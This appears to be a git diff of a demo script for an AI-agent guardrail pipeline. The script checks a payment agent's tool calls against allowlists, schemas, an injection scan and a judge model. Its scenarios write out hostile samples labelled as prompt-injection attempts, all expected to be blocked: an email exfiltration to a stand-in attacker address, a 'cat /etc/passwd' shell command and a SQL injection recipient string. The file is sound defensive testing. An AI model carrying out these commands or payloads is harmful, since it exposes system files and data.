@@ -1,124 +1,130 @@
 """
-demo.py — End-to-end proof that Agent Integrity Engine works.
+End-to-end demonstration of the Niyam-AI enforcement pipeline.
 
-Simulates a TransactionAgent being called with:
-  1. A legitimate tool call        → ALLOWED  ✓
-  2. A forbidden tool call         → BLOCKED  ✗
-  3. A prompt-injection attempt    → BLOCKED  ✗
-  4. A valid tool with bad payload → BLOCKED  ✗
+Exercises all five layers through the public AgentIntegritySession API,
+the same path a production integration would use:
 
-Then prints the tamper-proof execution ledger.
+    Layer 1  allowlist / denylist + schema
+    Layer 2  payload injection scan
+    Layer 3  control-flow sequence (session-bound to IntentHash)
+    Layer 4  Judge model classification
+    Layer 5  zk-SNARK prove + verify
+
+Five scenarios are simulated:
+  1. Legitimate tool call                  -> ALLOWED, proof generated
+  2. Forbidden tool (email exfiltration)   -> BLOCKED at allowlist
+  3. Unlisted tool (shell access)          -> BLOCKED at allowlist
+  4. Allowed tool, malformed payload       -> BLOCKED at schema
+  5. Allowed tool, injection in payload    -> BLOCKED at payload inspection
+
+The tamper-evident execution ledger is printed at the end.
+
 """
 
-import sys
+import argparse
 import os
-sys.path.insert(0, os.path.dirname(__file__))
-
-import jsonschema
-from schema.intent_contract import IntentContract
-from schema.tool_gate import ToolAuthorityGate, ToolAuthorizationError
-from schema.execution_ledger import ExecutionLedger
-from schema.control_flow import ControlFlowIntegrity, ControlFlowViolation
-from schema.intent_seal import IntentSeal, HashIntentContract
-from policy.policy_loader import PolicyLoader
-
-# ── 1. Load policy from YAML ──────────────────────────────────────────────────
-policy = PolicyLoader.load("policy/guardrails.yaml")
-print(f"\nLoaded policy for agent: {policy['agent']}")
-print(f"   Allowed : {policy['allowed_tools']}")
-print(f"   Forbidden: {policy['forbidden_tools']}")
-
-# ── 2. Seal the intent ────────────────────────────────────────────────────────
-raw_intent = HashIntentContract(
-    agent_name=policy["agent"],
-    user_task="Process payment of $200 to Alice",
-    allowed_tools=policy["allowed_tools"],
-    forbidden_tools=policy["forbidden_tools"],
-)
-
-sealer = IntentSeal()
-sealed = sealer.seal_intent(raw_intent)
-print(f"\n🔐 Intent sealed | hash={sealed.hash[:24]}...")
-
-assert sealer.verify_seal(sealed), "Seal verification failed!"
-print("okkk Seal verified — contract is immutable for this session\n")
-
-# ── 3. Build the gate + ledger ────────────────────────────────────────────────
-contract = IntentContract(
-    agent_name=sealed.agent_name,
-    user_task=sealed.user_task,
-    allowed_tools=sealed.allowed_tools,
-    forbidden_tools=sealed.forbidden_tools,
-)
-intent_hash = contract.intent_hash()
-
-gate = ToolAuthorityGate(contract)
-ledger = ExecutionLedger()
-flow = ControlFlowIntegrity(allowed_sequence=["proceed_transaction"])
-
-# ── 4. Simulate tool calls ────────────────────────────────────────────────────
-def simulate_tool_call(tool_name: str, payload: dict, label: str):
-    print(f"{'─'*60}")
-    print(f"Agent attempts: {label}")
-    print(f"   tool={tool_name}  payload={payload}")
-    try:
-        gate.authorize(tool_name, payload)
-        flow.validate_step(tool_name)
-        ledger.add_entry(intent_hash, tool_name, "ALLOWED", "Passed all checks")
-        print(f"   okkk ALLOWED")
-    except ToolAuthorizationError as e:
-        ledger.add_entry(intent_hash, tool_name, "BLOCKED", str(e))
-        print(f"   Nopee BLOCKED — {e}")
-    except ControlFlowViolation as e:
-        ledger.add_entry(intent_hash, tool_name, "BLOCKED", str(e))
-        print(f"   Nopee FLOW VIOLATION — {e}")
-    except jsonschema.ValidationError as e:
-        ledger.add_entry(intent_hash, tool_name, "BLOCKED", e.message)
-        print(f"   Nopee SCHEMA ERROR — {e.message}")
+import sys
 
 
-# Test 1: Legitimate call
-simulate_tool_call(
-    "proceed_transaction",
-    {"amount": 200, "recipient": "Alice"},
-    "Legitimate payment"
-)
 
-# Test 2: Forbidden tool — direct attempt
-simulate_tool_call(
-    "send_email",
-    {"to": "hacker@evil.com", "body": "Here is the receipt"},
-    "Prompt injection — email exfiltration"
-)
+from integrations.llm_middleware import AgentIntegritySession, IntentViolation
 
-# Test 3: Tool not in allowed list at all
-simulate_tool_call(
-    "shell_exec",
-    {"cmd": "cat /etc/passwd"},
-    "Prompt injection — shell access"
-)
+from pathlib import Path
+HERE = Path(__file__).resolve().parent
+sys.path.insert(0, str(HERE))
+# sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-# Test 4: Allowed tool but malformed payload
-simulate_tool_call(
-    "proceed_transaction",
-    {"amount": "not-a-number", "recipient": "Bob"},
-    "Valid tool, invalid payload (amount is a string)"
-)
 
-print("EXECUTION LEDGER (tamper-proof chain)")
-print(f"{'═'*60}")
-for i, entry in enumerate(ledger.ledge):
-    icon = "okkk" if entry["status"] == "ALLOWED" else "Nopee"
-    print(f"\n[{i}] {icon} {entry['status']}")
-    print(f"    tool      : {entry['tool']}")
-    print(f"    reason    : {entry['reason']}")
-    print(f"    timestamp : {entry['timestamp']}")
-    print(f"    prev_hash : {entry['previous_hash'][:24]}...")
-    print(f"    entry_hash: {entry['entry_hash'][:24]}...")
+def proceed_transaction(amount, recipient):
+    return f"Transferred ${amount} to {recipient}"
 
-print(f"\n{'═'*60}")
-chain_ok = ledger.verify_chain()
-print(f"Chain integrity: {'VALID ✓' if chain_ok else 'TAMPERED ✗'}")
-violations = ledger.get_violations()
-print(f"Violations logged: {len(violations)}")
-print(f"{'═'*60}\n")
+
+def send_email(to, body):
+    return f"Email sent to {to}"
+
+
+def shell_exec(cmd):
+    return f"Executed: {cmd}"
+
+
+SCENARIOS = [
+    ("Legitimate payment",
+     "proceed_transaction", {"amount": 200, "recipient": "Alice"}),
+
+    ("Prompt injection - email exfiltration",
+     "send_email", {"to": "attacker@example.com", "body": "Here is the receipt"}),
+
+    ("Prompt injection - shell access",
+     "shell_exec", {"cmd": "cat /etc/passwd"}),
+
+    ("Valid tool, malformed payload (amount is a string)",
+     "proceed_transaction", {"amount": "not-a-number", "recipient": "Bob"}),
+
+    ("Valid tool, SQL injection in payload",
+     "proceed_transaction", {"amount": 50, "recipient": "Bob'; DROP TABLE users--"}),
+]
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--no-zk", action="store_true",
+                    help="run layers 1-4 only, skipping proof generation")
+    args = ap.parse_args()
+
+    print("\n" + "=" * 66)
+    print("  NIYAM-AI - END-TO-END PIPELINE DEMONSTRATION")
+    print("=" * 66)
+
+    # policy_file = os.path.join(HERE, "policy", "guardrails.yaml")
+    # if not policy_file.exists():
+    #     raise FileNotFoundError(f"Policy file not found at: {policy_file}")
+
+    session = AgentIntegritySession.from_policy(
+        policy_path=HERE / "policy" / "guardrails.yaml",
+        user_task="Process payment of $200 to Alice",
+        zk_enabled=not args.no_zk,
+    )
+
+    session.register_tool("proceed_transaction", proceed_transaction)
+    session.register_tool("send_email", send_email)
+    session.register_tool("shell_exec", shell_exec)
+
+    allowed = blocked = 0
+
+    for label, tool_name, payload in SCENARIOS:
+        print("\n" + "-" * 66)
+        print(f"  {label}")
+        print(f"    tool    : {tool_name}")
+        print(f"    payload : {payload}")
+        try:
+            result = session.call_tool(tool_name, **payload)
+            allowed += 1
+            print(f"    RESULT  : ALLOWED - {result}")
+        except IntentViolation as e:
+            blocked += 1
+            print(f"    RESULT  : BLOCKED at layer '{e.layer}' - {e.reason}")
+        except Exception as e:
+            blocked += 1
+            print(f"    RESULT  : BLOCKED - {type(e).__name__}: {e}")
+
+    print("\n" + "=" * 66)
+    print(f"  {allowed} allowed, {blocked} blocked")
+    print("=" * 66)
+
+    session.print_ledger()
+
+    summary = session.session_summary()
+    print("\n  SESSION SUMMARY")
+    for k, v in summary.items():
+        print(f"    {k:<14}: {v}")
+
+    if not args.no_zk:
+        print("\n  Proofs for allowed actions were written to "
+              "ezkl_pipeline/session_proofs/")
+        print("  Each can be independently verified with ezkl.verify() using "
+              "only vk.key and settings.json - no model weights required.")
+    print()
+
+
+if __name__ == "__main__":
+    main()
